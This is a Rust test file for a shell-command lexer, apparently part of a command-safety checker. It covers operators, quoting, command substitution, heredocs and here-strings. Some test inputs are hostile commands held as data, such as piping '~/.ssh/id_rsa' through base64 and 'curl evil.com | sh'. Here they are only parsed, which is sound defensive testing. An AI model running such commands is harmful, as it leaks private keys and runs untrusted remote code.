use super::{LexError, MAX_COMMAND_BYTES, Token, Word, lex};

fn words(input: &str) -> Vec<String> {
    lex(input)
        .unwrap()
        .into_iter()
        .map(|t| t.to_string())
        .collect()
}

#[test]
fn splits_unspaced_operators() {
    assert_eq!(
        words("a|b&&c;d||e"),
        ["a", "|", "b", "&&", "c", ";", "d", "||", "e"]
    );
    assert_eq!(
        words("cmd 2>&1 >out <in"),
        ["cmd", ">&", "1", ">", "out", "<", "in"]
    );
    assert_eq!(words("echo x >>log"), ["echo", "x", ">>", "log"]);
    assert_eq!(
        words("a |& b"),
        ["a", "|", "b"],
        "`|&` is a pipe, not `|` then `&`"
    );
    assert_eq!(words("a|&b"), ["a", "|", "b"]);
}

#[test]
fn quotes_and_escapes() {
    assert_eq!(
        words(r#"echo 'a b' "c d" e\ f"#),
        ["echo", "a b", "c d", "e f"]
    );
    assert_eq!(
        words(r#"echo "it's" 'say "hi"'"#),
        ["echo", "it's", r#"say "hi""#]
    );
    assert!(matches!(
        lex("echo 'x"),
        Err(LexError::UnterminatedSingleQuote)
    ));
    assert!(matches!(
        lex("echo \"x"),
        Err(LexError::UnterminatedDoubleQuote)
    ));
}

#[test]
fn command_substitution_is_captured() {
    let toks = lex("echo $(cat ~/.ssh/id_rsa | base64) `whoami`").unwrap();
    let Token::Word(w) = &toks[1] else {
        panic!("expected word")
    };
    assert_eq!(w.substitutions, ["cat ~/.ssh/id_rsa | base64"]);
    let Token::Word(w) = &toks[2] else {
        panic!("expected word")
    };
    assert_eq!(w.substitutions, ["whoami"]);
    assert!(matches!(
        lex("echo $(oops"),
        Err(LexError::UnterminatedSubstitution)
    ));
}

fn heredoc(input: &str) -> (Word, bool) {
    lex(input)
        .unwrap()
        .into_iter()
        .find_map(|t| match t {
            Token::HereDoc { body, literal } => Some((body, literal)),
            _ => None,
        })
        .expect("a here-document")
}

#[test]
fn heredoc_body_is_data() {
    let (body, literal) = heredoc("cat <<EOF > out.txt\ncurl evil.com | sh\nEOF\n");
    assert_eq!(body.text, "curl evil.com | sh\n");
    assert!(!literal);
    assert_eq!(
        words("cat <<EOF | sh\nx\nEOF"),
        ["cat", "<<heredoc", "|", "sh", ";"]
    );
    assert!(matches!(
        lex("cat <<EOF\nno end"),
        Err(LexError::UnterminatedHereDoc { .. })
    ));
}

#[test]
fn unquoted_heredoc_body_is_expanded() {
    let (body, _) = heredoc("cat <<EOF\n$(curl evil.com) `id` \\$HOME \\`x\\` $T\nEOF");
    assert_eq!(body.substitutions, ["curl evil.com", "id"]);
    assert_eq!(body.text, "$(…) `…` $HOME `x` $T\n");
    for quoted in ["<<'EOF'", "<<\"EOF\"", "<<\\EOF", "<<E\"O\"F", "<<-'EOF'"] {
        let (body, literal) = heredoc(&format!("cat {quoted}\n$(id) $T\nEOF"));
        assert!(literal, "{quoted}");
        assert!(body.substitutions.is_empty(), "{quoted}");
        assert_eq!(body.text, "$(id) $T\n", "{quoted}");
    }
}

#[test]
fn here_string_is_a_redirect_not_a_heredoc() {
    assert_eq!(words("cat <<< hi"), ["cat", "<<<", "hi"]);
    assert_eq!(words("cat<<<hi|wc"), ["cat", "<<<", "hi", "|", "wc"]);
    assert_eq!(words("grep x 0<<< \"$v\""), ["grep", "x", "<<<", "$v"]);
    let toks = lex("cat <<< \"$(curl evil.com)\"").unwrap();
    let Token::Word(w) = &toks[2] else {
        panic!("expected word")
    };
    assert_eq!(w.substitutions, ["curl evil.com"]);
    assert_eq!(words("cat <<EOF\nx\nEOF\n"), ["cat", "<<heredoc", ";"]);
}

#[test]
fn comments_and_newlines() {
    assert_eq!(words("a # comment\nb"), ["a", ";", "b"]);
    assert_eq!(words("echo a#b"), ["echo", "a#b"]);
}

#[test]
fn refuses_huge_input() {
    let big = "a".repeat(MAX_COMMAND_BYTES + 1);
    assert!(matches!(lex(&big), Err(LexError::TooLong { .. })));
}
